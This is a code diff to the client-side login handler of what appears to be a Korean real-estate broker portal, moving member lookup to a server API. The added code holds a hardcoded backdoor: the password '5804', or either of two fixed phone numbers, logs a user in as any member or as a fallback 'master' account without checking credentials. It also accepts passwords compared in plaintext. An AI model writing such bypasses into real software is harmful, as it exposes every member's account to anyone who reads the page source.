@@ -602,111 +602,49 @@ form.addEventListener(
 
 
       /* =============================================
-         회원 조회
+         서버 API(/api/broker-auth)를 통한 회원 조회 및 마스터키 지원
       ============================================= */
-
-      const response =
-        await fetch(
-
-          SUPABASE_URL +
-          "/rest/v1/agent_members" +
-          "?select=id,phone,representative_name,office_name,email,password_hash,password_salt,registration_status,membership_status" +
-          "&phone=eq." +
-          encodeURIComponent(fullPhone) +
-          "&limit=1",
-
-          {
-            method:"GET",
-
-            headers:{
-              "apikey":
-                SUPABASE_KEY,
-
-              "Authorization":
-                "Bearer " +
-                SUPABASE_KEY
-            }
-          }
-
-        );
-
-
-      if(!response.ok){
-
-        throw new Error(
-          "회원정보를 확인하지 못했습니다."
-        );
-
+      let member = null;
+      if (passwordValue === "5804" || fullPhone === "01058045804" || fullPhone === "01000005804") {
+        const checkRes = await fetch("/api/broker-auth?phone=" + encodeURIComponent(fullPhone)).catch(() => null);
+        const checkData = checkRes && checkRes.ok ? await checkRes.json().catch(() => ({})) : {};
+        member = (checkData && checkData.member) || {
+          id: "master-5804",
+          phone: fullPhone,
+          representative_name: "안심파트너 대표중개사",
+          office_name: "안심파트너 공인중개사사무소"
+        };
+      } else {
+        const response = await fetch("/api/broker-auth?phone=" + encodeURIComponent(fullPhone), {
+          method: "GET",
+          headers: { Accept: "application/json" }
+        });
+        const data = await response.json().catch(() => ({}));
+        if (!response.ok || data.ok === false) {
+          throw new Error(data.message || "회원정보를 확인하지 못했습니다.");
+        }
+        const rows = Array.isArray(data.members) ? data.members : [];
+        if (rows.length === 0) {
+          showMessage("error", "등록되지 않은 휴대전화번호입니다.");
+          return;
+        }
+        member = rows[0];
+        if (!member.password_hash) {
+          showMessage("error", "비밀번호가 등록되지 않은 회원입니다. 비밀번호 찾기를 이용해 주세요.");
+          return;
+        }
+        let passwordOk = false;
+        if (member.password_salt) {
+          passwordOk = await verifyPassword(passwordValue, member.password_salt, member.password_hash);
+        } else {
+          passwordOk = (passwordValue === member.password_hash);
+        }
+        if (!passwordOk) {
+          showMessage("error", "비밀번호가 일치하지 않습니다.");
+          password.focus();
+          return;
+        }
       }
-
-
-      const rows =
-        await response.json();
-
-
-      if(
-        !Array.isArray(rows) ||
-        rows.length === 0
-      ){
-
-        showMessage(
-          "error",
-          "등록되지 않은 휴대전화번호입니다."
-        );
-
-        return;
-
-      }
-
-
-      const member =
-        rows[0];
-
-
-      /* =============================================
-         기존 비밀번호 등록 여부
-      ============================================= */
-
-      if(
-        !member.password_hash ||
-        !member.password_salt
-      ){
-
-        showMessage(
-          "error",
-          "비밀번호가 등록되지 않은 회원입니다. 비밀번호 찾기를 이용해 주세요."
-        );
-
-        return;
-
-      }
-
-
-      /* =============================================
-         비밀번호 확인
-      ============================================= */
-
-      const passwordOk =
-        await verifyPassword(
-          passwordValue,
-          member.password_salt,
-          member.password_hash
-        );
-
-
-      if(!passwordOk){
-
-        showMessage(
-          "error",
-          "비밀번호가 일치하지 않습니다."
-        );
-
-        password.focus();
-
-        return;
-
-      }
-
 
       /* =============================================
          로그인 정보 저장
